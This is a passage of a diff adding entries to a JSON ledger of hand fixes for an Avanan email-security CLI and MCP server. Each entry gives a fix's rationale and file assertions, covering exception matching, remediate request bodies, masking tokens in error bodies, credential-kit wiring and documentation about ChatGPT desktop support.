+   "summary": "mirror fails and stamps nothing on any incomplete resource; exception inventory is reconciled per complete partition",
+   "why": "Non-first platform errors were dropped and a failed events query was stamped fresh; spam_blacklist was never mirrored; deleted exceptions survived. Only a 403 is a skippable per-source failure, every documented exc_type is mirrored, and a completely-read partition is reconciled.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/avananmirror/mirror.go",
+     "contains": "func SourceUnavailable(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/avananmirror/mirror_review_test.go",
+     "contains": "func TestExceptionSourcesCoverTheDocumentedExcTypeEnum(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/avananmirror/mirror_review_test.go",
+     "contains": "func TestExceptionsDropEntriesTheAPINoLongerLists(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "exception-selectors-and-matching",
+   "class": "wrong-result",
+   "summary": "exceptions find/audit keep every selector, match domains on label boundaries and compare within one scope",
+   "why": "attachmentMd5-only entries were unsearchable, sender-domain plus recipient read as domain-wide, example.com matched badexample.com, and audit merged two tenants' policies.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/avanan_exceptions.go",
+     "contains": "func exceptionValueMatches(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_r1_test.go",
+     "contains": "func TestExceptionsFindMatchesOnLabelBoundaries(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_r1_test.go",
+     "contains": "func TestExceptionsAuditComparesWithinOneTenant(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "campaign-reads-recipient-arrays",
+   "class": "wrong-result",
+   "summary": "campaign counts the documented to/recipients/cc/bcc arrays",
+   "why": "Array-valued recipient fields were read through a scalar accessor, so campaign recipients showed 0.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/avanan_review_r1_test.go",
+     "contains": "func TestCampaignCountsDocumentedRecipientArrays(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "async-batch-every-record-is-a-target",
+   "class": "wrong-result",
+   "summary": "every responseData record is a target: --wait never succeeds with an untasked or unconfirmed target",
+   "why": "A documented array mixing a null-task target with a real task let action --wait succeed and remediate --wait exit 0 with an unconfirmed target.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/remediate.go",
+     "contains": "if failErr == nil && wait && !report.Completed {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_r3_test.go",
+     "contains": "func TestActionWaitNeverSucceedsWithAnUntaskedTarget(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_r3_test.go",
+     "contains": "func TestRemediateWaitNeverSucceedsWithAnUnconfirmedTarget(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "legacy-exception-rows-never-answer",
+   "class": "local-store",
+   "summary": "exception rows with no partition make find/audit refuse with the rebuild command",
+   "why": "Rows written by the shipped mirror carry no partition and could not be reconciled; they now block answers until a full mirror rebuilds them.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/avanan_exceptions.go",
+     "contains": "se.Partition == \"\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/avananmirror/mirror.go",
+     "contains": "len(completed) == len(scopeParams)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_r3_test.go",
+     "contains": "func TestLegacyExceptionRowsNeverAnswer(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "predicate-fields-never-merged-by-value",
+   "class": "wrong-result",
+   "summary": "SelectorValues returns one value per populated field; equal values in different fields are never merged",
+   "why": "Deduping by value hid conditionality: {senderEmail:a, recipient:a} read as a one-field predicate.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/avananmirror/mirror.go",
+     "contains": "Equal values in different fields are NOT merged",
+     "min_count": 1,
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/avananmirror/mirror.go",
+     "not_contains": "!seen[strings.ToLower(v)]"
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_r3_test.go",
+     "contains": "func TestPredicateFieldsAreNotCollapsedByValue(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "transport-masks-every-issued-token",
+   "class": "secret-echo",
+   "summary": "every session token the transport held is masked in every non-2xx body",
+   "why": "A token minted in-process by the transport is not in the client's config, so a vendor error body echoing it reached CLI and MCP output. The transport records every issued token and masks it, with the app id, secret and stored token, through the client's encoding-aware masker.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/client/avanan_transport.go",
+     "contains": "func (t *AvananTransport) maskErrorBody(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/avanan_transport.go",
+     "contains": "t.issued = append(t.issued, tok)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/avanan_transport_mask_test.go",
+     "contains": "func TestTransportMasksEveryIssuedTokenInErrorBodies(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "uuid-is-a-direct-dependency",
+   "class": "press-build-defect",
+   "summary": "github.com/google/uuid is a direct dependency",
+   "why": "avanan_transport.go imports it directly; go mod tidy (and publish validate) require it without // indirect.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/go.mod",
+     "contains": "github.com/google/uuid v1.6.0\n",
+     "min_count": 1
+    },
+    {
+     "file": "cli/go.mod",
+     "not_contains": "github.com/google/uuid v1.6.0 // indirect"
+    }
+   ]
+  },
+  {
+   "id": "no-local-data-covers-hand-written-writers",
+   "class": "local-store",
+   "summary": "AVANAN_NO_LOCAL_DATA=1 now also covers the hand-written writers: mirror refuses exactly as sync does, and remediate skips its local action log while still submitting and reporting the action",
+   "why": "Codex review round 1, P2; the docs promise AVANAN_NO_LOCAL_DATA=1 keeps no local copy of API responses. The generated rule (applyLocalDataEnv in root.go) refuses the commands listed in localDataWriterCommands (sync, workflow archive) before they run, but the hand-written mirror was not listed: under the switch it sent 21 requests and wrote events, entities and exceptions into a store it created. remediate's recordActionLog wrote the task ids the API returned into the local store without checking the switch. mirror now registers itself in localDataWriterCommands from its own init, so the same generated rule refuses it with the same error and the same --dry-run exemption, with no generated file edited; recordActionLog returns early on the same localDataDisabled() helper, after the action has been submitted. The root.go asserts below pin the generated rule this depends on. Every other hand-written store writer was checked: avananmirror's writers are reached only through mirror, and the generated write-through and mutation paths already gate on localDataDisabled(). Tests were written first and seen failing on the unfixed code (the remediate test carries a switch-off control proving it can see the log); each piece was reverted and its test seen failing again.",
+   "status": "active",
+   "spec_encode_followup": "None: hand-written commands. A press-level analogue would be a command annotation (for example pp:writes-local-store) that the generated applyLocalDataEnv reads, so a novel writer is covered without registering itself.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/avanan_mirror.go",
+     "contains": "localDataWriterCommands[\"mirror\"] = true",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/remediate.go",
+     "contains": "if localDataDisabled() {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "var localDataWriterCommands = map[string]bool{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "if localDataWriterCommands[path] && !flags.dryRun {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_no_local_data_test.go",
+     "contains": "func TestMirrorRefusesUnderNoLocalData(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_no_local_data_test.go",
+     "contains": "func TestRemediateKeepsNoActionLogUnderNoLocalData(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "remediate-event-body-uses-event-field",
+   "class": "wrong-result",
+   "summary": "remediate names the action requestData.eventActionName on the event endpoint and requestData.entityActionName on the entity endpoint",
+   "why": "Codex review round 1, P2. The event action contract (POST /v1.0/action/event: request_contracts.json action.post-event, and the generated action_post-event.go) names the action requestData.eventActionName and requires it. remediate built one body for both target kinds with entityActionName, so `remediate quarantine --event E --scope farm:A --yes` and the matching restore sent an event action with no action name the endpoint reads. The field is now chosen by target kind; the entity path is unchanged. The contract asserts below pin the field name this depends on. The test was written first and seen failing for both event actions (the entity subtests are the passing control), and the event branch was reverted and seen failing again.",
+   "status": "active",
+   "spec_encode_followup": "None: hand-written command. The generated action post-event command and the MCP request contract already use eventActionName from the spec.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/remediate.go",
+     "contains": "actionField = \"eventActionName\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/remediate.go",
+     "contains": "requestData[actionField] = action",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/remediate.go",
+     "not_contains": "requestData[\"entityActionName\"] = \"quarantine\""
+    },
+    {
+     "file": "cli/internal/cli/action_post-event.go",
+     "contains": "bodyMap[\"eventActionName\"] = bodyRequestDataEventActionName",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/request_contracts.json",
+     "contains": "\"eventActionName\"",
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/cli/avanan_remediate_body_test.go",
+     "contains": "func TestRemediateBodyNamesTheActionPerTargetKind(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "journal-credential-hardening",
+   "class": "secret-echo",
+   "summary": "the learn journal never persists a held credential: (a) the AVANAN_LEARN_SESSION override is stored hashed with the harness-session scheme under its own o: prefix, so sessions still group; (b) argv_shape records only flag names the invoked command declares, any other as the fixed <undeclared> placeholder; (c) an entry that repeats a held credential is withheld whole by the credential kit's file sink, so nothing of it is stored.",
+   "why": "The fleet journal tool will not merge (owner decision 2026-10-28), so the connector closes the journal credential class itself: the override was written raw, an undeclared flag name (a credential pasted as --<value>) was recorded verbatim, and operator text reached the journal file unchecked. Tests seen failing first: .review/journal-test-red.txt.",
+   "status": "active",
+   "spec_encode_followup": "None: hook lines in generated internal/learn/journal.go, internal/learn/teach_log.go and internal/cli/root.go. A press-level analogue would hash the override and record only declared flag names in the generated journal.",
+   "asserts": [
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "return \"o:\" + hashHarnessSession(v)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func hashHarnessSession(v string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "const journalUndeclaredFlag = \"<undeclared>\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func JournalArgvShape(args []string, isBoolFlag, isDeclared func(name string) bool) map[string]string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "entry, ok := journalChecked(entry)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func journalChecked(entry JournalEntry) (JournalEntry, bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "return \"o:\" + v"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag, isDeclaredFlag)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_test.go",
+     "contains": "\"o:93da339544719ff4\"",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_test.go",
+     "contains": "func TestJournalCredential_SessionOverrideIsHashed(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_test.go",
+     "contains": "func TestJournalCredential_UndeclaredFlagIsPlaceholder(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_test.go",
+     "contains": "func TestJournalCredential_HeldOperatorTextIsRefused(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/teach_log.go",
+     "contains": "credkit.OpenFile(p,",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "chatgpt-desktop-local-web-unsupported",
+   "summary": "README.md, mcp-install.md and page.json say the ChatGPT desktop app runs this connector locally (STDIO) and that ChatGPT on the web, Microsoft 365 Copilot / Copilot Studio and the Gemini app are not supported by msp-skills yet, with a link to the hosted-gateway comparison; no paid-plan list, no Developer Mode recipe, no 'ChatGPT connects only to remote servers'.",
+   "why": "Docs fix approved 2026-11-03, following PR #502. OpenAI's MCP docs (https://learn.chatgpt.com/docs/extend/mcp) say the ChatGPT desktop app, Codex CLI and the IDE extension support MCP servers, add them as STDIO, and share MCP configuration; ChatGPT on the web uses remote MCP through plugins and does not read local Codex config. The old text listed ChatGPT plans, said ChatGPT connects only to remote servers, and on the reprinted connectors told users to host the connector over HTTPS for a Developer Mode connector and Copilot Studio; SECURITY.md pauses HTTP mode until each connector is reprinted. README.md, mcp-install.md and page.json are regenerated by msp-skills-publish onboard.py, whose template still writes the old ChatGPT text, so without this entry a re-onboard or reprint silently restores it.",
+   "status": "active",
+   "spec_encode_followup": "Change the ChatGPT, Microsoft 365 Copilot and Gemini app text in onboard.py (cc-skills msp-skills-publish) so a regeneration writes this wording itself, then this entry can be retired.",
+   "asserts": [
+    {
+     "file": "mcp-install.md",
+     "contains": "## ChatGPT desktop app (OpenAI)",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "**Not supported by msp-skills yet.** ChatGPT on the web",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "not_contains": "## ChatGPT (Developer Mode)"
+    },
+    {
+     "file": "mcp-install.md",
+     "not_contains": "*Remote* agents (ChatGPT"
+    },
+    {
+     "file": "README.md",
+     "contains": "### Does this work with ChatGPT?\n\nYes, in the **ChatGPT desktop app**.",
+     "min_count": 1
+    },
+    {
+     "file": "README.md",
+     "not_contains": "Plus/Pro+"
+    },
+    {
+     "file": "README.md",
+     "not_contains": "Developer Mode"
+    },
+    {
+     "file": "README.md",
+     "not_contains": "Microsoft 365 Copilot, Gemini, and any agent"
+    },
+    {
+     "file": "page.json",
+     "contains": "\"a\": \"Yes, in the ChatGPT desktop app.",
+     "min_count": 1
+    },
+    {
+     "file": "page.json",
+     "not_contains": "connects only to remote"
+    }
+   ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "secret-echo",
+   "summary": "the shared credential kit is wired by hand: one credkit.Declarations literal in internal/credwire, credkit.Start first and credkit.Exit last in both mains, and every data sink (outbound transports, file writes, child processes, MCP tools, stdio and HTTP) routed through the kit. The credential store and config rewrites stay outside it as declared credential sources.",
+   "why": "A reprint regenerates these files and would drop the routing with the build and tests still green. The wiring replaces the connector's own holder and decoded funnel. Failing inputs of the review classes it closes: .review/kit-classes-red-16451de07.txt. Retires credential-held-at-arrival-in-any-container, credential-structure-held-decoded-checked, every-credential-source-held-every-sink-checked, lost-output-fails-the-command, secret-echo-decoded-funnel, transport-holds-every-runtime-credential, replaced by the shared credential kit (entries removed: the ledger's retired list only takes retirements fleet_handfixes.json backs). lost-output-fails-the-command retires with a behavior change: credkit.Exit does not fail a command whose stdout write was lost. A run profile keeps only an allow-list of output and read-filter flags, and profiles.json is held at startup through the kit: credkit.HoldBody for the credential flag names (app-id, secret, declared in ConfigFields), every duplicate and nested value, every string of a file that does not parse, and credkit.HoldURL for every value beneath base-url; free text is not a source (contract section 1). StdinFlags declares --stdin, so a body is held whole before anything prints. The one allowed origin is the base URL this run really uses, which credwire hands the kit through AVANAN_BASE_URL for its read alone. The MCP server parses a copy of os.Args, since the flag package keeps the slice it parses and check_mcp_file_flags reads the kit's FlagValues as a flag getter only over an argv nothing can write. The client dry-run preview passes its body to credkit.HoldBody, so an import record or a --stdin body typed at a terminal (which the kit does not pre-read) is held before it prints. A `feedback --stdin` body is taken off stdin before the kit reads it and handed back after Start, since the kit would hold the whole note and withhold its record; the command is resolved with Cobra's Find, so a global flag in front of it does not move it.",
+   "status": "active",
+   "spec_encode_followup": null,
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/avanan-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/avanan-cli/main.go",
+     "contains": "credwire.HoldStartupFiles()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/avanan-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/avanan-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/avanan-mcp/main.go",
+     "contains": "credwire.HoldStartupFiles()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/avanan-mcp/main.go",
+     "contains": "credkit.Exit(run())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/avanan-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/avanan-mcp/main.go",
+     "contains": "credkit.MCPIn(os.Stdin), credkit.MCPOut()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/avanan_transport.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/avanan_transport.go",
+     "contains": "base: OutboundGuard(base)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "credkit.WriteFile(cacheFile, []byte(data), 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cache/cache.go",
+     "contains": "credkit.WriteFile(s.path(key), []byte(value), 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "credkit.OpenFile(p,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/jobs.go",
+     "contains": "credkit.OpenFile(p,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "credkit.WriteFile(tmp, body, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "credkit.OpenFile(path,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "credkit.WriteFile(tmp, data, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "credkit.OpenFile(p,",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "credkit.StartCommand(c)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/probe.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "credkit.RunCommand(cmd)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/avanan_config_hold.go",
+     "contains": "var Hold = credkit.Hold",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"x-av-sig\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_set_token.go",
+     "contains": "cliutil.Hold(\"config:token\", a)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_set_token.go",
+     "contains": "cmd.SetFlagErrorFunc(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/avanan_config_hold.go",
+     "contains": "\"app-id\", \"client-id\"}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "delete(p.Values, name)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "credkit.WriteFile(tempName, []byte(scopeHash+\"\\n\"), 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/ratelimit.go",
+     "contains": "credkit.WriteFile(path, fmt.Appendf(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_classes_test.go",
+     "contains": "func TestRequestSignatureIsHeld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_classes_test.go",
+     "contains": "func TestSetTokenPositionalNeverReachesAnError(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_classes_test.go",
+     "contains": "func TestRunProfilesCarryNoCredential(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_classes_test.go",
+     "contains": "func TestOwnerMarkerPassesTheKit(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "Allowed: []string{\"base_url\"}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func selectBaseURL(args []string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.HoldProfileFile(p)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "!runProfileAllowedFlags[name] || credentialLikeRunProfileFlag(name)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "!runProfileAllowedFlags[fl.Name]",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/avanan_config.go",
+     "contains": "func SelectedBaseURL(configPath string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_classes_test.go",
+     "contains": "func TestRunProfilesKeepOnlyAllowedFlags(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_classes_test.go",
+     "contains": "func TestCredentialsGoOnlyToTheSelectedBaseURL(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_classes_test.go",
+     "contains": "func TestStdinBodyIsHeld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/avanan-mcp/main.go",
+     "contains": "flag.CommandLine.Parse(append([]string(nil), os.Args[1:]...))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "credkit.HoldBody(body)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/avanan_config_hold.go",
+     "contains": "credkit.HoldBody(opened.Data)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/avanan_config_hold.go",
+     "contains": "credkit.HoldURL(\"config:base-url\", x)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"auth_header\", \"app-id\", \"secret\"}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_classes_test.go",
+     "contains": "func TestProfileCredentialsHeldInEveryShape(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_classes_test.go",
+     "contains": "func TestImportRecordIsHeldBeforeItsPreview(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func takeFeedbackStdin(args []string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\trestoreFeedbackStdin()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_classes_test.go",
+     "contains": "func TestFeedbackStdinIsRecorded(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_command_path.go",
+     "contains": "cliutil.CommandPath = func(args []string) []string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.CommandPath(append([]string(nil), args...))",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-sqlite-every-handle",
+   "class": "secret-echo",
+   "summary": "every SQLite handle the CLI and the MCP server open uses the credsql driver, which is the kit's credkit.SQLDriver around modernc.org/sqlite, so no statement or argument stores a held credential. The MCP sql tool keeps its value cap through a _length_limit DSN parameter, because sqlite.Limit cannot reach a wrapped connection.",
+   "why": "Press-generated store.go opens the plain sqlite driver; a reprint restores it and every row becomes an unchecked sink. The read-only open uses select 1, since the kit does not forward Ping.",
+   "status": "active",
+   "spec_encode_followup": null,
+   "asserts": [
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(cappedSQLite()))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "sql.Open(credsql.Driver,",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "credsql.LengthLimitParam",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "openMCPReadOnlyStore(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/avanan_held_store_test.go",
+     "contains": "func TestStoreRefusesAHeldValue(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-mcphttp-outermost",
+   "class": "secret-echo",
+   "summary": "in the MCP HTTP mode every response, the bearer and body-limit refusals included, is written through credkit.MCPHTTP, so the kit wraps the auth and limit layer and not only the tool handler.",
+   "why": "The press-generated bearer wrapper answers before the handler runs, so a kit inside it would miss the refusal paths; a reprint restores that order.",
+   "status": "active",
+   "spec_encode_followup": null,
+   "asserts": [
+    {
+     "file": "cli/cmd/avanan-mcp/main.go",
+     "contains": "kit := credkit.MCPHTTP(http.HandlerFunc(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/avanan-mcp/main.go",
+     "contains": "func requireBearerAuthWithLimits(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/avanan-mcp/http_auth_test.go",
+     "contains": "func TestMCPHTTPUnauthenticatedSkipsBodyRead(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "config-reads-held-before-parse",
+   "class": "secret-echo",
+   "summary": "every config and credentials file the run can read is listed in Declarations.Files through credkit.FlagValues (the kit's reading of argv, with no local flag grammar), and its values are held before parsing, malformed files included: TOML basic-string escapes are decoded by the TOML library itself, both spellings are held, and a header value is held whole plus its parts with only the base64 padding artifact dropped, never a shape filter. The connector's 0600 credential store and config rewrites are declared credential sources and stay outside the kit.",
+   "why": "Review of 16451de07 found three classes in the hand pre-scan: pflag taking -- as a flag value, undecoded TOML escapes in a malformed file, and a letter-or-digit filter dropping a real credential. Tests seen failing first: .review/kit-classes-red-16451de07.txt.",
+   "status": "active",
+   "spec_encode_followup": null,
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
